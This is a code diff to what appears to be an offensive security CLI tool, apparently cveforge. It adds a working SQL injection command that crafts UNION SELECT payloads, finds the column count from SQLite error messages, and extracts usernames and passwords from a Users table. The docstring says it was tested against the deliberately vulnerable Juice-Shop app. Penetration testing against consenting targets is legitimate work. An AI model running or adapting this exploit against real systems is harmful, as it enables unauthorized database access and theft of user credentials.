@@ -10,6 +10,7 @@ from urllib3.util import parse_url
 from cveforge import tcve_command, tcve_option, Context
 from cveforge.core.commands.executables.owasp.injections.xml import XMLSession
 from cveforge.core.commands.executables.owasp.utils import get_cookies, get_headers
+from cveforge.utils.format import cve_format
 
 
 @tcve_command(categories=["cwe-91", "cwe-611", "cwe-776", "cwe-643"])
@@ -19,16 +20,107 @@ def inject():
 
 
 @tcve_option(inject, is_command=True)
-def sql(target: str = typer.Option(..., help="Target URL for SQL Injection")):
-    """Perform SQL Injection Test"""
+def sql(
+    target: str = typer.Argument(..., help="Target URL for SQL Injection"),
+    headers: Annotated[Optional[list[str,]], typer.Option("--header", "-H")] = None,
+    cookies: Annotated[Optional[str], typer.Option("--cookies", "-b")] = None,
+    custom_payload: Annotated[Optional[str], typer.Option("--payload", "-f")] = None,
+    method: Annotated[
+        Literal[
+            HTTPMethod.POST,
+            HTTPMethod.PATCH,
+            HTTPMethod.CONNECT,
+            HTTPMethod.DELETE,
+            HTTPMethod.GET,
+            HTTPMethod.TRACE,
+            HTTPMethod.HEAD,
+            HTTPMethod.OPTIONS,
+        ],
+        typer.Option(
+            "-X",
+            "--method",
+        ),
+    ] = HTTPMethod.GET,
+    proxy: Optional[str] = typer.Option(default=None),
+    blind: bool = typer.Option(
+        default=False,
+        help="Use Blind SQL Injection techniques, this relies on time based techniques",
+    ),
+    verbose: bool = typer.Option(default=False),
+    max_columns: int = typer.Option(
+        default=20, help="Maximum number of columns to attempt to enumerate"
+    ),
+):
+    """
+    Perform SQL Injection on a given endpoint, it opens an SQL like session to the endpoint allowing you to write SQL commands into the DB
+    What it does?
+    First given the current operational table try to read the columns so we can transparently use the SELECT and others (by autofilling the columns)
+    Queries looks like:
+        SELECT * FROM Products WHERE id = '1' UNION <YOUR QUERY HERE> -- ;
+
+    usage:
+    ```sh
+    inject sql http://localhost:3000/search?q=^INJECTABLE^
+    # SELECT * FROM Users WHERE username = 'admin';
+    # SELECT * FROM SQLite_master;
+    ```
+    Tested against Juice-Shop
+    """
     typer.echo(f"Performing SQL Injection test on {target}")
     # Placeholder for actual SQL injection logic
-    pass
+
+    def _request(columns: list[str], table: Optional[str] = None):
+        columns_formatted = ", ".join(columns)
+        table_formatted = f"FROM {table}" if table else ""
+        malicius_query = f"')) UNION SELECT {columns_formatted} {table_formatted};-- " # Seems to have a length limit for the query field please try with the login username field instead
+        print(f"Trying query: {malicius_query}")
+        return requests.request(
+            method=method,
+            url=cve_format(target),
+            params={"q": malicius_query},
+            headers=get_headers(headers),
+            cookies=get_cookies(cookies),
+            proxies={"http": proxy} if proxy else None,
+        )
+
+    vulnerable_table_columns_count = 0
+    for _ in range(max_columns):
+        res = _request(["null"] * (vulnerable_table_columns_count + 1))
+        vulnerable_table_columns_count += 1
+        if (
+            re.search(
+                "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns",
+                res.text,
+            )
+            is None
+        ):
+            print(
+                f"Vulnerable number of columns found: {vulnerable_table_columns_count}"
+            )
+            break
+    else:
+        typer.echo("Could not determine the number of vulnerable columns")
+        return
+
+    parts = ["null"] * vulnerable_table_columns_count
+
+    tables_columns = parts.copy()
+    tables_columns[0] = "username"
+    tables_columns[1] = "password"
+    # response = _request(tables_columns, "SQLite_master")
+    response = _request(tables_columns, "Users")
+
+    if response.headers.get("Content-Type", "").startswith("application/json"):
+        Context().stdout.print_json(response.text)
+    else:
+        Context().stdout.print(response.text)
 
 
 @tcve_option(inject, is_command=True)
 def xss(target: str = typer.Option(..., help="Target URL for XSS Injection")):
-    """Perform XSS Injection Test"""
+    """
+    Perform XSS Injection Test
+    """
     typer.echo(f"Performing XSS Injection test on {target}")
     # Placeholder for actual XSS injection logic
     pass
@@ -99,7 +191,7 @@ def xml(
         file.seek(0)
         response = requests.request(
             method=method,
-            url=target,
+            url=cve_format(target),
             headers=r_headers,
             cookies=r_cookies,
             files={file_name: ("file.xml", file, "text/xml")},
